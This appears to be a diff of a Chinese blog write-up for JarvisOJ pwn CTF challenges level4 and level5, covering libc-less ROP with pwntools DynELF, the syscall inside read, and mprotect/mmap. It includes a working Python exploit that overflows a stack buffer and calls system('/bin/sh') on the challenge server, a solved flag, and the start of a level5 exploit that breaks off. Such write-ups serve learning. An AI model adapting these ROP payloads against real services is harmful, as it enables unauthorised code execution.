+<span id="cb9-3"><a href="#cb9-3" aria-hidden="true" tabindex="-1"></a>  <span class="dt">char</span> buf<span class="op">;</span> <span class="co">// [sp+0h] [bp-88h]@1</span></span>
+<span id="cb9-4"><a href="#cb9-4" aria-hidden="true" tabindex="-1"></a>  <span class="cf">return</span> read<span class="op">(</span><span class="dv">0</span><span class="op">,</span> <span class="op">&amp;</span>buf<span class="op">,</span> <span class="bn">0x100</span><span class="bu">u</span><span class="op">);</span></span>
+<span id="cb9-5"><a href="#cb9-5" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
+<p>既然这样，我们只能在无<code>libc</code>的情况下的ROP 我们有两个选择
+&gt; 1.
+利用write函数泄露内存，加上pwntools中的DynELF函数遍历got表，猜解lic版本和system函数及"/bin/sh"字符串的位置，然后ROP起shell
+&gt; 2.
+利用read函数将"/bin/sh"字符串写入可写位置，然后利用read函数中的syscall起shell</p>
 <p>解释一下两个方法的原理：</p>
-<h2 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h2><p><code>write</code>函数泄露指定地址内存这个就不说了，上面的题目都有，最主要解释一下pwntools中的DynELF函数的原理<br>pwntools中的DynELF是利用可循环利用的泄露内存函数去遍历获取程序got表中的所有函数的真实内存地址，然后通过地址低12位猜测是哪个版本的libc，如果找得到对应版本就用内存地址减去对应函数偏移得到libc加载的基地址，匹配不到就GG</p>
-<h2 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h2><p><code>read</code>函数写入指定可写地址原理也不提了，read中的syscall是重点<br>这是我最近做了几次类似的题才领悟的，起初看别的大佬wp并不明白为啥是这样。在libc的read函数中，一般会在<code>&lt;read+14&gt;</code>的位置存在一个syscall调用。猜测可能是大部分或者部分libc的通用代码，所以才造就了这个固定的位置存在<code>syscall</code>调用。所以我们只要泄露了<code>read</code>函数的真实内存地址，加上固定偏移<code>0xe</code>就能得到<code>syscall</code>的真实内存地址，即使开了ASLR，也不会改变低位的地址，所以这个方法也同样适用。然后就是正常的ROP，用gadget控制传入参数，然后跳到<code>syscall</code>地址就好了<br>32位程序需要将eax=0xb，ebx=”/bin/sh”字符串地址,ecx=0,edx=0,然后调用<code>syscall</code><br>64位则需要将rdi=”/bin/sh”字符串地址,rsi=0,rdx=0,,然后同样调用<code>syscall</code><br>我则采用方法一写的poc(因为方法二的成功率看起来并不是很高，在没有办法的时候可采用)</p>
-<pre><code class="lang-python">from pwn import * 
-#pro = process(&quot;./level4&quot;)
-pro = remote(&quot;pwn2.jarvisoj.com&quot;, 9880)
-#context.log_level = &#39;debug&#39;
-elf = ELF(&quot;./level4&quot;)
-def respone(recv_buf,send_buf,new_line=True):
-    pro.recvuntil(recv_buf)
-    if new_line:
-        pro.sendline(send_buf)
-    else:
-        pro.send(send_buf)
-#泄露内存函数
-def leak(address):
-    payload = &quot;A&quot;*0x88
-    payload += &quot;\x00\x00\x00\x00&quot;
-    payload += p32(elf.plt[&#39;write&#39;])
-    payload +=p32(0x0804844B) #return read Address，回到vulnerable_function
-    payload +=p32(1)#arg1
-    payload +=p32(address)#arg2
-    payload +=p32(4)#arg3
-    pro.sendline(payload)
-    data  = pro.recv(4)
-    return data
-
-d = DynELF(leak,elf=ELF(&quot;./level4&quot;))
-system_addr = d.lookup(&quot;system&quot;,&quot;libc&quot;)
-log.info(hex(system_addr))
-
-data_bin_sh_addr =  0x804a01c
-pop_3_ret_addr = 0x8048509
-
-payload = &quot;A&quot;*0x88
-payload += &quot;\x00\x00\x00\x00&quot;
-payload += p32(elf.plt[&#39;read&#39;])
-payload +=p32(pop_3_ret_addr) #32位程序需要堆栈平衡，不然read的三个参数会一直留在栈上
-payload +=p32(0)
-payload +=p32(data_bin_sh_addr)
-payload +=p32(8)
-#堆栈平衡后继续劫持到system_addr
-payload += p32(system_addr)
-payload +=p32(0xf)#随便一个返回地址
-payload +=p32(data_bin_sh_addr)#/bin/sh字符串地址
-
-pro.sendline(payload)
-pro.sendline(&#39;/bin/sh\x00&#39;)
-pro.interactive()
-</code></pre>
-<p>注意到<code>leak</code>函数并没有进行堆栈平衡，<code>leak</code>的执行会让栈空间一直往低地址增长，一次多三个参数。更好的<code>payload</code>应该是要做堆栈平衡，以免<code>leak</code>函数执行次数过多，造成不可预知意外<br><strong>Flag: CTF{882130cf51d65fb705440b218e94e98e}</strong></p>
-<h1 id="level-5"><a href="#level-5" class="headerlink" title="level 5"></a>level 5</h1><p>这次换成了64位的程序，和接下来的<code>level3 x64</code>的附件是一样的，包括程序和<code>libc</code><br>这次仍然给出了一个具有栈溢出漏洞的函数,但是题目要求假设<code>system</code>和<code>execve</code>被禁用，利用<code>mprotect</code>和<code>mmap</code>来解决</p>
-<pre><code class="lang-C">ssize_t vulnerable_function()
-{
-  char buf; // [sp+0h] [bp-80h]@1
-  write(1, &quot;Input:\n&quot;, 7uLL);
-  return read(0, &amp;buf, 0x200uLL);
-}
-</code></pre>
+<h2 id="方法一">方法一</h2>
+<p><code>write</code>函数泄露指定地址内存这个就不说了，上面的题目都有，最主要解释一下pwntools中的DynELF函数的原理
+pwntools中的DynELF是利用可循环利用的泄露内存函数去遍历获取程序got表中的所有函数的真实内存地址，然后通过地址低12位猜测是哪个版本的libc，如果找得到对应版本就用内存地址减去对应函数偏移得到libc加载的基地址，匹配不到就GG</p>
+<h2 id="方法二">方法二</h2>
+<p><code>read</code>函数写入指定可写地址原理也不提了，read中的syscall是重点
+这是我最近做了几次类似的题才领悟的，起初看别的大佬wp并不明白为啥是这样。在libc的read函数中，一般会在<code>&lt;read+14&gt;</code>的位置存在一个syscall调用。猜测可能是大部分或者部分libc的通用代码，所以才造就了这个固定的位置存在<code>syscall</code>调用。所以我们只要泄露了<code>read</code>函数的真实内存地址，加上固定偏移<code>0xe</code>就能得到<code>syscall</code>的真实内存地址，即使开了ASLR，也不会改变低位的地址，所以这个方法也同样适用。然后就是正常的ROP，用gadget控制传入参数，然后跳到<code>syscall</code>地址就好了
+32位程序需要将eax=0xb，ebx="/bin/sh"字符串地址,ecx=0,edx=0,然后调用<code>syscall</code>
+64位则需要将rdi="/bin/sh"字符串地址,rsi=0,rdx=0,,然后同样调用<code>syscall</code>
+我则采用方法一写的poc(因为方法二的成功率看起来并不是很高，在没有办法的时候可采用)</p>
+<div class="sourceCode" id="cb10"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb10-1"><a href="#cb10-1" aria-hidden="true" tabindex="-1"></a><span class="im">from</span> pwn <span class="im">import</span> <span class="op">*</span> </span>
+<span id="cb10-2"><a href="#cb10-2" aria-hidden="true" tabindex="-1"></a><span class="co">#pro = process(&quot;./level4&quot;)</span></span>
+<span id="cb10-3"><a href="#cb10-3" aria-hidden="true" tabindex="-1"></a>pro <span class="op">=</span> remote(<span class="st">&quot;pwn2.jarvisoj.com&quot;</span>, <span class="dv">9880</span>)</span>
+<span id="cb10-4"><a href="#cb10-4" aria-hidden="true" tabindex="-1"></a><span class="co">#context.log_level = &#39;debug&#39;</span></span>
+<span id="cb10-5"><a href="#cb10-5" aria-hidden="true" tabindex="-1"></a>elf <span class="op">=</span> ELF(<span class="st">&quot;./level4&quot;</span>)</span>
+<span id="cb10-6"><a href="#cb10-6" aria-hidden="true" tabindex="-1"></a><span class="kw">def</span> respone(recv_buf,send_buf,new_line<span class="op">=</span><span class="va">True</span>):</span>
+<span id="cb10-7"><a href="#cb10-7" aria-hidden="true" tabindex="-1"></a>    pro.recvuntil(recv_buf)</span>
+<span id="cb10-8"><a href="#cb10-8" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> new_line:</span>
+<span id="cb10-9"><a href="#cb10-9" aria-hidden="true" tabindex="-1"></a>        pro.sendline(send_buf)</span>
+<span id="cb10-10"><a href="#cb10-10" aria-hidden="true" tabindex="-1"></a>    <span class="cf">else</span>:</span>
+<span id="cb10-11"><a href="#cb10-11" aria-hidden="true" tabindex="-1"></a>        pro.send(send_buf)</span>
+<span id="cb10-12"><a href="#cb10-12" aria-hidden="true" tabindex="-1"></a><span class="co">#泄露内存函数</span></span>
+<span id="cb10-13"><a href="#cb10-13" aria-hidden="true" tabindex="-1"></a><span class="kw">def</span> leak(address):</span>
+<span id="cb10-14"><a href="#cb10-14" aria-hidden="true" tabindex="-1"></a>    payload <span class="op">=</span> <span class="st">&quot;A&quot;</span><span class="op">*</span><span class="bn">0x88</span></span>
+<span id="cb10-15"><a href="#cb10-15" aria-hidden="true" tabindex="-1"></a>    payload <span class="op">+=</span> <span class="st">&quot;</span><span class="ch">\x00\x00\x00\x00</span><span class="st">&quot;</span></span>
+<span id="cb10-16"><a href="#cb10-16" aria-hidden="true" tabindex="-1"></a>    payload <span class="op">+=</span> p32(elf.plt[<span class="st">&#39;write&#39;</span>])</span>
+<span id="cb10-17"><a href="#cb10-17" aria-hidden="true" tabindex="-1"></a>    payload <span class="op">+=</span>p32(<span class="bn">0x0804844B</span>) <span class="co">#return read Address，回到vulnerable_function</span></span>
+<span id="cb10-18"><a href="#cb10-18" aria-hidden="true" tabindex="-1"></a>    payload <span class="op">+=</span>p32(<span class="dv">1</span>)<span class="co">#arg1</span></span>
+<span id="cb10-19"><a href="#cb10-19" aria-hidden="true" tabindex="-1"></a>    payload <span class="op">+=</span>p32(address)<span class="co">#arg2</span></span>
+<span id="cb10-20"><a href="#cb10-20" aria-hidden="true" tabindex="-1"></a>    payload <span class="op">+=</span>p32(<span class="dv">4</span>)<span class="co">#arg3</span></span>
+<span id="cb10-21"><a href="#cb10-21" aria-hidden="true" tabindex="-1"></a>    pro.sendline(payload)</span>
+<span id="cb10-22"><a href="#cb10-22" aria-hidden="true" tabindex="-1"></a>    data  <span class="op">=</span> pro.recv(<span class="dv">4</span>)</span>
+<span id="cb10-23"><a href="#cb10-23" aria-hidden="true" tabindex="-1"></a>    <span class="cf">return</span> data</span>
+<span id="cb10-24"><a href="#cb10-24" aria-hidden="true" tabindex="-1"></a>    </span>
+<span id="cb10-25"><a href="#cb10-25" aria-hidden="true" tabindex="-1"></a>d <span class="op">=</span> DynELF(leak,elf<span class="op">=</span>ELF(<span class="st">&quot;./level4&quot;</span>))</span>
+<span id="cb10-26"><a href="#cb10-26" aria-hidden="true" tabindex="-1"></a>system_addr <span class="op">=</span> d.lookup(<span class="st">&quot;system&quot;</span>,<span class="st">&quot;libc&quot;</span>)</span>
+<span id="cb10-27"><a href="#cb10-27" aria-hidden="true" tabindex="-1"></a>log.info(<span class="bu">hex</span>(system_addr))</span>
+<span id="cb10-28"><a href="#cb10-28" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb10-29"><a href="#cb10-29" aria-hidden="true" tabindex="-1"></a>data_bin_sh_addr <span class="op">=</span>  <span class="bn">0x804a01c</span></span>
+<span id="cb10-30"><a href="#cb10-30" aria-hidden="true" tabindex="-1"></a>pop_3_ret_addr <span class="op">=</span> <span class="bn">0x8048509</span></span>
+<span id="cb10-31"><a href="#cb10-31" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb10-32"><a href="#cb10-32" aria-hidden="true" tabindex="-1"></a>payload <span class="op">=</span> <span class="st">&quot;A&quot;</span><span class="op">*</span><span class="bn">0x88</span></span>
+<span id="cb10-33"><a href="#cb10-33" aria-hidden="true" tabindex="-1"></a>payload <span class="op">+=</span> <span class="st">&quot;</span><span class="ch">\x00\x00\x00\x00</span><span class="st">&quot;</span></span>
+<span id="cb10-34"><a href="#cb10-34" aria-hidden="true" tabindex="-1"></a>payload <span class="op">+=</span> p32(elf.plt[<span class="st">&#39;read&#39;</span>])</span>
+<span id="cb10-35"><a href="#cb10-35" aria-hidden="true" tabindex="-1"></a>payload <span class="op">+=</span>p32(pop_3_ret_addr) <span class="co">#32位程序需要堆栈平衡，不然read的三个参数会一直留在栈上</span></span>
+<span id="cb10-36"><a href="#cb10-36" aria-hidden="true" tabindex="-1"></a>payload <span class="op">+=</span>p32(<span class="dv">0</span>)</span>
+<span id="cb10-37"><a href="#cb10-37" aria-hidden="true" tabindex="-1"></a>payload <span class="op">+=</span>p32(data_bin_sh_addr)</span>
+<span id="cb10-38"><a href="#cb10-38" aria-hidden="true" tabindex="-1"></a>payload <span class="op">+=</span>p32(<span class="dv">8</span>)</span>
+<span id="cb10-39"><a href="#cb10-39" aria-hidden="true" tabindex="-1"></a><span class="co">#堆栈平衡后继续劫持到system_addr</span></span>
+<span id="cb10-40"><a href="#cb10-40" aria-hidden="true" tabindex="-1"></a>payload <span class="op">+=</span> p32(system_addr)</span>
+<span id="cb10-41"><a href="#cb10-41" aria-hidden="true" tabindex="-1"></a>payload <span class="op">+=</span>p32(<span class="bn">0xf</span>)<span class="co">#随便一个返回地址</span></span>
+<span id="cb10-42"><a href="#cb10-42" aria-hidden="true" tabindex="-1"></a>payload <span class="op">+=</span>p32(data_bin_sh_addr)<span class="co">#/bin/sh字符串地址</span></span>
+<span id="cb10-43"><a href="#cb10-43" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb10-44"><a href="#cb10-44" aria-hidden="true" tabindex="-1"></a>pro.sendline(payload)</span>
+<span id="cb10-45"><a href="#cb10-45" aria-hidden="true" tabindex="-1"></a>pro.sendline(<span class="st">&#39;/bin/sh</span><span class="ch">\x00</span><span class="st">&#39;</span>)</span>
+<span id="cb10-46"><a href="#cb10-46" aria-hidden="true" tabindex="-1"></a>pro.interactive()</span></code></pre></div>
+<p>注意到<code>leak</code>函数并没有进行堆栈平衡，<code>leak</code>的执行会让栈空间一直往低地址增长，一次多三个参数。更好的<code>payload</code>应该是要做堆栈平衡，以免<code>leak</code>函数执行次数过多，造成不可预知意外</p>
+<p><strong>Flag: CTF{882130cf51d65fb705440b218e94e98e}</strong></p>
+<h1 id="level-5">level 5</h1>
+<p>这次换成了64位的程序，和接下来的<code>level3 x64</code>的附件是一样的，包括程序和<code>libc</code>
+这次仍然给出了一个具有栈溢出漏洞的函数,但是题目要求假设<code>system</code>和<code>execve</code>被禁用，利用<code>mprotect</code>和<code>mmap</code>来解决</p>
+<div class="sourceCode" id="cb11"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb11-1"><a href="#cb11-1" aria-hidden="true" tabindex="-1"></a><span class="dt">ssize_t</span> vulnerable_function<span class="op">()</span></span>
+<span id="cb11-2"><a href="#cb11-2" aria-hidden="true" tabindex="-1"></a><span class="op">{</span></span>
+<span id="cb11-3"><a href="#cb11-3" aria-hidden="true" tabindex="-1"></a>  <span class="dt">char</span> buf<span class="op">;</span> <span class="co">// [sp+0h] [bp-80h]@1</span></span>
+<span id="cb11-4"><a href="#cb11-4" aria-hidden="true" tabindex="-1"></a>  write<span class="op">(</span><span class="dv">1</span><span class="op">,</span> <span class="st">&quot;Input:</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">,</span> <span class="dv">7</span><span class="bu">uLL</span><span class="op">);</span></span>
+<span id="cb11-5"><a href="#cb11-5" aria-hidden="true" tabindex="-1"></a>  <span class="cf">return</span> read<span class="op">(</span><span class="dv">0</span><span class="op">,</span> <span class="op">&amp;</span>buf<span class="op">,</span> <span class="bn">0x200</span><span class="bu">uLL</span><span class="op">);</span></span>
+<span id="cb11-6"><a href="#cb11-6" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
 <p>先来了解一下<code>mprotect</code>和<code>mmap</code>函数</p>
-<h2 id="mprotect"><a href="#mprotect" class="headerlink" title="mprotect"></a>mprotect</h2><pre><code class="lang-C"> int mprotect(const void *start, size_t len, int prot);
-</code></pre>
-<p> 在Linux中，mprotect()函数可以用来修改一段指定内存区域的保护属性。<br>mprotect()函数把自start开始的、长度为len的内存区的保护属性修改为prot指定的值,就是常见的0x111对应执行，写，读权限</p>
-<pre><code> 需要注意的是第一个参数――起始地址`start`必须是内存对齐的地址，且第二参数`len`也是内存对齐Align的整数倍。linux64bit默认内存对齐长度是0x1000(4096),32bit则是0x400(1024)。一开始没注意到这个，浪费了不少时间。
-</code></pre><h2 id="mmap"><a href="#mmap" class="headerlink" title="mmap"></a>mmap</h2><pre><code class="lang-C">void *mmap( void *start , size_t length , int prot , int flags , int fd , off_t offsize)
-</code></pre>
-<p>参数start：</p>
-<ul>
-<li>指向欲映像的内存起始地址，通常设为NULL，代表让系统自动标明地址，映像成功后返回该地址。</li>
-</ul>
-<p>参数length：</p>
-<ul>
-<li>代表将文件中多大的部分映像到内存。</li>
-</ul>
-<p>参数prot：映像区域的保护方式。可以为以下几种方式的组合：</p>
-<ul>
-<li>PROT_EXEC映像区域可被执行</li>
-<li>PROT_READ映像区域可被读取</li>
-<li>PROT_WRITE映像区域可被写入</li>
-<li>PROT_NONE映像区域不能存取</li>
-</ul>
+<h2 id="mprotect">mprotect</h2>
+<div class="sourceCode" id="cb12"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb12-1"><a href="#cb12-1" aria-hidden="true" tabindex="-1"></a> <span class="dt">int</span> mprotect<span class="op">(</span><span class="dt">const</span> <span class="dt">void</span> <span class="op">*</span>start<span class="op">,</span> <span class="dt">size_t</span> len<span class="op">,</span> <span class="dt">int</span> prot<span class="op">);</span> </span></code></pre></div>
+<p>在Linux中，mprotect()函数可以用来修改一段指定内存区域的保护属性。
+mprotect()函数把自start开始的、长度为len的内存区的保护属性修改为prot指定的值,就是常见的0x111对应执行，写，读权限</p>
+<pre><code> 需要注意的是第一个参数――起始地址`start`必须是内存对齐的地址，且第二参数`len`也是内存对齐Align的整数倍。linux64bit默认内存对齐长度是0x1000(4096),32bit则是0x400(1024)。一开始没注意到这个，浪费了不少时间。</code></pre>
+<h2 id="mmap">mmap</h2>
+<div class="sourceCode" id="cb14"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb14-1"><a href="#cb14-1" aria-hidden="true" tabindex="-1"></a><span class="dt">void</span> <span class="op">*</span>mmap<span class="op">(</span> <span class="dt">void</span> <span class="op">*</span>start <span class="op">,</span> <span class="dt">size_t</span> length <span class="op">,</span> <span class="dt">int</span> prot <span class="op">,</span> <span class="dt">int</span> flags <span class="op">,</span> <span class="dt">int</span> fd <span class="op">,</span> off_t offsize<span class="op">)</span></span></code></pre></div>
+<p>参数start： +
+指向欲映像的内存起始地址，通常设为NULL，代表让系统自动标明地址，映像成功后返回该地址。</p>
+<p>参数length： + 代表将文件中多大的部分映像到内存。</p>
+<p>参数prot：映像区域的保护方式。可以为以下几种方式的组合： +
+PROT_EXEC映像区域可被执行 + PROT_READ映像区域可被读取 +
+PROT_WRITE映像区域可被写入 + PROT_NONE映像区域不能存取</p>
 <p>参数flags：影响映像区域的各种特性。在调用mmap（）时必须要指定MAP_SHARED或MAP_PRIVATE。</p>
 <ul>
 <li>MAP_FIXED：如果参数start所指的地址无法成功建立映像时，则放弃映像，不对地址做修正。通常不鼓励用此旗标。</li>
 <li>MAP_SHARED：对映像区域的写入数据会复制回文件内，而且允许其他映像该文件的进程共享，原来的文件会改变。</li>
-<li>MAP_PRIVATE：对映像区域的写入操作会产生一个映像文件的复制，即私人的“写入时复制”（copy on write）对此区域作的任何修改都不会写回原来的文件内容。当共享的对象的虚拟存储区域为私有对象时，修改只会被本进程中改变。<em>（学的操作系统终于派上用场了）</em></li>
+<li>MAP_PRIVATE：对映像区域的写入操作会产生一个映像文件的复制，即私人的“写入时复制”（copy
+on
+write）对此区域作的任何修改都不会写回原来的文件内容。当共享的对象的虚拟存储区域为私有对象时，修改只会被本进程中改变。<em>（学的操作系统终于派上用场了）</em></li>
 <li>MAP_ANONYMOUS：建立匿名映像。此时会忽略参数fd，不涉及文件，而且映像区域无法和其他进程共享。</li>
 <li>MAP_DENYWRITE：只允许对映像区域的写入操作，其他对文件直接写入的操作将会被拒绝。</li>
-<li>MAP_LOCKED：将映像区域锁定住，这表示该区域不会被置换（swap）。<br>参数fd：</li>
-<li>要映像到内存中的文件描述符。如果使用匿名内存映像时，即flags中设置了MAP_ANONYMOUS，fd设为-1。有些系统不支持匿名内存映像，则可以使用fopen打开/dev/zero文件，然后对该文件进行映像，可以同样达到匿名内存映像的效果。<br>参数offset：</li>
+<li>MAP_LOCKED：将映像区域锁定住，这表示该区域不会被置换（swap）。
+参数fd：</li>
+<li>要映像到内存中的文件描述符。如果使用匿名内存映像时，即flags中设置了MAP_ANONYMOUS，fd设为-1。有些系统不支持匿名内存映像，则可以使用fopen打开/dev/zero文件，然后对该文件进行映像，可以同样达到匿名内存映像的效果。
+参数offset：</li>
 <li>文件映像的偏移量，通常设置为0，代表从文件最前方开始对应，offset必须是分页大小的整数倍。</li>
 </ul>
-<p>返回值：</p>
-<ul>
-<li>若映像成功则返回映像区的内存起始地址，否则返回MAP_FAILED（－1），错误原因存于errno中。</li>
-</ul>
+<p>返回值： +
+若映像成功则返回映像区的内存起始地址，否则返回MAP_FAILED（－1），错误原因存于errno中。</p>
 <p>上一张图说明mmap的具体作用是什么：</p>
-<p><img src="/2018/02/05/JarvisOJ-PWN-Writeup专题/14-43-47.jpg" alt=""><br>现在我们可以知道，mmap的作用就是<strong>将文件态的部分映射到程序的虚拟空间中</strong>(程序虚拟空间指的是程序可见的地址，包括已分配和可以被分配的两部分内存，即我们操作系统里面所说的程序可占有4G大小的虚拟内存)，然后通过设<code>mmap</code>的参数<code>flags</code>和<code>port</code>就可以控制映射到虚拟空间中的内存的执行、读写权限以及是否修改源文件，是否共享或者私有(用到咱们学的<code>copy-on-write</code>技术，即写时拷贝，每个程序试图修改时才会产生一个拷贝副本)，是否锁定（不允许页置换）等属性。还不理解可以结合in nek大佬在知乎上对<code>mmap</code>函数的解释来理解。<a href="https://www.zhihu.com/question/48161206" target="_blank" rel="noopener">知乎- Linux 中 mmap() 函数的内存映射问题理解？-in nek 的回答</a><br>总得来说，mmap对于我们的作用就是在程序虚拟空间产生一段可读写、可执行的内存段，对于是哪个文件映射过来我们并不关心，但是为了避免我们在内存段中写入ShellCode回写至被映射的文件而产生莫名的错误，我建议选择<code>MAP_PRIVATE</code>即修改时会产生一个内存副本，而不会修改被映射的文件内容。而第五个参数是被映射文件的文件描述符<code>fd</code>，我们知道平常我们得到的文件描述符是由<code>fopen</code>这类函数的返回值得到的，默认的0是<code>stdin</code>,1是<code>stdout</code>。由于我们并不想知道也并不关心哪个文件或者区域被映射到内存中所以我建议使用匿名映射—<code>MAP_ANONYMOUS</code>。如上秒描述的一样，当<code>MAP_ANONYMOUS</code>时，文件描述符<code>fd</code>会被置为<code>-1</code>被无视掉，更为贴切我们不在乎谁被映射的要求。<br>先写一个C程序把<code>flags</code>属性对应的值输出来看一下<br><img src="/2018/02/05/JarvisOJ-PWN-Writeup专题/14-39-45.jpg" alt=""><br>接下来我们就是要构造这样的函数调用</p>
-<pre><code class="lang-C">//原型
-void *mmap( void *start , size_t length , int prot , int flags , int fd , off_t offsize)
-//构造函数调用
-mmap(segment_addr , 0x1000 , 0x111 ,32+2 ,-1 , 0 )
-</code></pre>
-<p>但是最主要的问题是mmap需要6个参数，而这个程序是64bit的。所以很难找到这样的一个gadget能够控制<code>rdi rsi rdx rcx r8 r9</code>这六个寄存器的。所以我们采用参数更少的<code>mprotect</code>函数<br>PS :当然，寻找控制6个参数的gadget的方法是存在的，可利用的是<code>_dl_runtime_resolve</code>函数。详见蒸米的文章<a href="http://www.vuln.cn/6643" target="_blank" rel="noopener">一步一步学ROP之gadgets和2free篇 - 蒸米</a>。32bit的程序则不存在这种问题。<br>函数<code>_dl_runtime_resolve</code>在这题的链接库<code>ld.2.19.so</code>版本中是存在的，而在我本地是<code>ld.2.26.so</code>，并不存在<code>_dl_runtime_resolve</code>，取而代之的是<code>_dl_runtime_resolve_avx_slow</code>，所以这个gadget还受目标系统so文件版本的影响。故不推荐在64bit程序下使用<code>mmap</code>函数<br><code>ld.2.19.so</code>下载地址: <a href="https://opensuse.pkgs.org/42.1/opensuse-update-oss/glibc-2.19-22.1.x86_64.rpm.html" target="_blank" rel="noopener">https://opensuse.pkgs.org/42.1/opensuse-update-oss/glibc-2.19-22.1.x86_64.rpm.html</a></p>
+<p><img src="/2018/02/05/JarvisOJ-PWN-Writeup专题/14-43-47.jpg">
+现在我们可以知道，mmap的作用就是<strong>将文件态的部分映射到程序的虚拟空间中</strong>(程序虚拟空间指的是程序可见的地址，包括已分配和可以被分配的两部分内存，即我们操作系统里面所说的程序可占有4G大小的虚拟内存)，然后通过设<code>mmap</code>的参数<code>flags</code>和<code>port</code>就可以控制映射到虚拟空间中的内存的执行、读写权限以及是否修改源文件，是否共享或者私有(用到咱们学的<code>copy-on-write</code>技术，即写时拷贝，每个程序试图修改时才会产生一个拷贝副本)，是否锁定（不允许页置换）等属性。还不理解可以结合in
+nek大佬在知乎上对<code>mmap</code>函数的解释来理解。<a href="https://www.zhihu.com/question/48161206" target="_blank" rel="noopener">知乎- Linux 中 mmap()
+函数的内存映射问题理解？-in nek 的回答</a>
+总得来说，mmap对于我们的作用就是在程序虚拟空间产生一段可读写、可执行的内存段，对于是哪个文件映射过来我们并不关心，但是为了避免我们在内存段中写入ShellCode回写至被映射的文件而产生莫名的错误，我建议选择<code>MAP_PRIVATE</code>即修改时会产生一个内存副本，而不会修改被映射的文件内容。而第五个参数是被映射文件的文件描述符<code>fd</code>，我们知道平常我们得到的文件描述符是由<code>fopen</code>这类函数的返回值得到的，默认的0是<code>stdin</code>,1是<code>stdout</code>。由于我们并不想知道也并不关心哪个文件或者区域被映射到内存中所以我建议使用匿名映射--<code>MAP_ANONYMOUS</code>。如上秒描述的一样，当<code>MAP_ANONYMOUS</code>时，文件描述符<code>fd</code>会被置为<code>-1</code>被无视掉，更为贴切我们不在乎谁被映射的要求。
+先写一个C程序把<code>flags</code>属性对应的值输出来看一下 <img src="/2018/02/05/JarvisOJ-PWN-Writeup专题/14-39-45.jpg">
+接下来我们就是要构造这样的函数调用</p>
+<div class="sourceCode" id="cb15"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb15-1"><a href="#cb15-1" aria-hidden="true" tabindex="-1"></a><span class="co">//原型</span></span>
+<span id="cb15-2"><a href="#cb15-2" aria-hidden="true" tabindex="-1"></a><span class="dt">void</span> <span class="op">*</span>mmap<span class="op">(</span> <span class="dt">void</span> <span class="op">*</span>start <span class="op">,</span> <span class="dt">size_t</span> length <span class="op">,</span> <span class="dt">int</span> prot <span class="op">,</span> <span class="dt">int</span> flags <span class="op">,</span> <span class="dt">int</span> fd <span class="op">,</span> off_t offsize<span class="op">)</span></span>
+<span id="cb15-3"><a href="#cb15-3" aria-hidden="true" tabindex="-1"></a><span class="co">//构造函数调用</span></span>
+<span id="cb15-4"><a href="#cb15-4" aria-hidden="true" tabindex="-1"></a>mmap<span class="op">(</span>segment_addr <span class="op">,</span> <span class="bn">0x1000</span> <span class="op">,</span> <span class="bn">0x111</span> <span class="op">,</span><span class="dv">32</span><span class="op">+</span><span class="dv">2</span> <span class="op">,-</span><span class="dv">1</span> <span class="op">,</span> <span class="dv">0</span> <span class="op">)</span></span></code></pre></div>
+<p>但是最主要的问题是mmap需要6个参数，而这个程序是64bit的。所以很难找到这样的一个gadget能够控制<code>rdi rsi rdx rcx r8 r9</code>这六个寄存器的。所以我们采用参数更少的<code>mprotect</code>函数
+PS
+:当然，寻找控制6个参数的gadget的方法是存在的，可利用的是<code>_dl_runtime_resolve</code>函数。详见蒸米的文章<a href="http://www.vuln.cn/6643" target="_blank" rel="noopener">一步一步学ROP之gadgets和2free篇 -
+蒸米</a>。32bit的程序则不存在这种问题。
+函数<code>_dl_runtime_resolve</code>在这题的链接库<code>ld.2.19.so</code>版本中是存在的，而在我本地是<code>ld.2.26.so</code>，并不存在<code>_dl_runtime_resolve</code>，取而代之的是<code>_dl_runtime_resolve_avx_slow</code>，所以这个gadget还受目标系统so文件版本的影响。故不推荐在64bit程序下使用<code>mmap</code>函数
+<code>ld.2.19.so</code>下载地址: <a href="https://opensuse.pkgs.org/42.1/opensuse-update-oss/glibc-2.19-22.1.x86_64.rpm.html" target="_blank" rel="noopener">https://opensuse.pkgs.org/42.1/opensuse-update-oss/glibc-2.19-22.1.x86_64.rpm.html</a></p>
 <hr>
-<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><blockquote>
-<ol>
+<h2 id="思路">思路</h2>
+<blockquote>
+<ol type="1">
 <li>利用<code>write</code>函数泄露内存地址，配合DynELF寻找libc加载基址</li>
 <li>通过基址和偏移，计算出<code>mprotect</code>和<code>read</code>函数的地址</li>
 <li>通过<code>mprotect</code>函数将程序bss段变成可执行可写入可读取状态</li>
@@ -437,285 +484,327 @@ mmap(segment_addr , 0x1000 , 0x111 ,32+2 ,-1 , 0 )
 </ol>
 </blockquote>
 <p>poc:</p>
-<pre><code class="lang-python">from pwn import * 
-libc = ELF(&quot;./libc-2.19.so&quot;)
-pro = remote(&quot;pwn2.jarvisoj.com&quot;, 9884)
-#context.log_level = &#39;debug&#39;
-context.arch = &#39;amd64&#39;
-elf = ELF(&quot;./level3_x64&quot;)
-def respone(recv_buf,send_buf,new_line=True):
-    pro.recvuntil(recv_buf)
-    if new_line:
-        pro.sendline(send_buf)
-    else:
-        pro.send(send_buf)
-
-rdi_ret_addr = 0x4006b3
-vulnerable_addr = 0x40062E
-data_addr = elf.bss()
-#__libc_csu_init 通用gadget
-init_gadget1 = 0x4006AA
-init_gadget2 = 0x400690
-#__libc_csu_init 通用gadget构造一个可循环利用的call函数，前提是需要知道got地址，且got地址对应的数据是真实内存地址
-#看不懂为什么这么构造的可以看我上一篇文章《百度杯11月pwnme》倒数第二段代码处的注释解释有__libc_csu_init 通用gadget的利用
-def _call(func_got,arg1,arg2,arg3,returnData=False):
-    Data = &quot;&quot;
-    payload = &quot;A&quot;*0x88
